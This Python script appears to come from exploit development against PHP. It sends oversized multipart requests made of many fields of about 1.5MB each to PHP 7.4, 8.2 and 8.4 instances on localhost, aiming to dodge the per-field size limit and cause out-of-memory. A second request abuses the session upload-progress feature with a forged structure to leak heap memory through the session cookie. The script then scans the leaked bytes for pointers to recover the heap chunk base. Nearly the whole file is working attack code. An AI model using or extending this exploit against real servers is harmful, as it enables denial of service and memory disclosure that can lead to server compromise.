"""Try to bypass the per-field limit using MULTIPLE smaller fields.
The per-field limit (ZEND_MM_MAX_LARGE_SIZE ~1.9MB) drops single fields > 1.9MB.
But multiple fields < 1.9MB should all be stored. Total > memory_limit → OOM.

Test: 100 × 1.5MB = 150MB total (each < 1.9MB limit).
On 7.4.33 (per-field limit) and 8.4.26 (no limit) as control.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def trial_multi(port, label, n_fields=100, field_mb=1.5, n_v=841):
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Request 1: OOM trigger with MULTIPLE smaller fields
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(n_fields):
        parts.append({"name": f"big{i:03d}", "data": b"B" * int(field_mb * 1024 * 1024)})
    total_mb = n_fields * field_mb
    print(f"  {label}: {n_fields} x {field_mb}MB = {total_mb:.0f}MB total", flush=True)
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n_v):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    # Try to extract chunk base
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Per-field limit bypass: multiple smaller fields ===", flush=True)
print("\n--- 7.4.33 (per-field limit) ---", flush=True)
trial_multi(18108, "7.4.33", n_fields=100, field_mb=1.5)
time.sleep(1)
trial_multi(18108, "7.4.33", n_fields=200, field_mb=1.0)
time.sleep(1)
trial_multi(18108, "7.4.33", n_fields=50, field_mb=3.0)
time.sleep(1)

print("\n--- 8.2.34 (per-field limit) ---", flush=True)
trial_multi(18111, "8.2.34", n_fields=100, field_mb=1.5)
time.sleep(1)

print("\n--- 8.4.26 (control, no limit) ---", flush=True)
trial_multi(18113, "8.4.26", n_fields=100, field_mb=1.5)
time.sleep(1)

print("=== done ===", flush=True)
